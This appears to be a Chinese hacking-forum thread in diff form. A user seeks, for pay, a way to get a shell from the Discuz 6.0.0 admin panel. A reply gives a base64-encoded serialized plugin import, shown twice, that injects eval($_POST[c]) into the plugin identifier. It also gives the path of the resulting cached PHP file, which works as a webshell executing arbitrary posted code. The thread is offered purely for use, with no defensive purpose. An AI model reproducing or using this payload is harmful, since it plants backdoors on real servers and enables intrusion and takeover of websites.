@@ -1,0 +1,30 @@
+dz6.0.0后台拿shell遇难
+
+dz6.0.0后台拿shell卡住了,有谁能帮助.钱少了点.0ldjun的 还有狼族的都不能用了。没研究过,不知道有能拿的没
+
+添加插件那里 提交以下代码 允许导入不同版本前面打勾
+
+   1. YToyOntzOjY6InBsdWdpbiI7YTo5OntzOjk6ImF2YWlsYWJsZSI7czoxOiIwIjtzOjc6ImFkbWluaWQi
+   2. O3M6MToiMCI7czo0OiJuYW1lIjtzOjg6IkdldFNoZWxsIjtzOjEwOiJpZGVudGlmaWVyIjtzOjI0OiJh
+   3. J109ZXZhbCgkX1BPU1RbY10pOyRhWyciO3M6MTE6ImRlc2NyaXB0aW9uIjtzOjA6IiI7czoxMDoiZGF0
+   4. YXRhYmxlcyI7czowOiIiO3M6OToiZGlyZWN0b3J5IjtzOjA6IiI7czo5OiJjb3B5cmlnaHQiO3M6MDoi
+   5. IjtzOjc6Im1vZHVsZXMiO3M6MDoiIjt9czo3OiJ2ZXJzaW9uIjtzOjU6IjYuMC4wIjt9
+
+
+地址：xxx.com/forumdata /cache/plugin_a']=eval($_POST[c]);$a['.php
+
+clannad回复
+
+添加插件那里 提交以下代码 允许导入不同版本前面打勾
+
+   1. YToyOntzOjY6InBsdWdpbiI7YTo5OntzOjk6ImF2YWlsYWJsZSI7czoxOiIwIjtzOjc6ImFkbWluaWQi
+   2. O3M6MToiMCI7czo0OiJuYW1lIjtzOjg6IkdldFNoZWxsIjtzOjEwOiJpZGVudGlmaWVyIjtzOjI0OiJh
+   3. J109ZXZhbCgkX1BPU1RbY10pOyRhWyciO3M6MTE6ImRlc2NyaXB0aW9uIjtzOjA6IiI7czoxMDoiZGF0
+   4. YXRhYmxlcyI7czowOiIiO3M6OToiZGlyZWN0b3J5IjtzOjA6IiI7czo5OiJjb3B5cmlnaHQiO3M6MDoi
+   5. IjtzOjc6Im1vZHVsZXMiO3M6MDoiIjt9czo3OiJ2ZXJzaW9uIjtzOjU6IjYuMC4wIjt9
+
+地址：xxx.com/forumdata /cache/plugin_a']=eval($_POST[c]);$a['.php
+	
+回复 2# clannad
+
+感谢
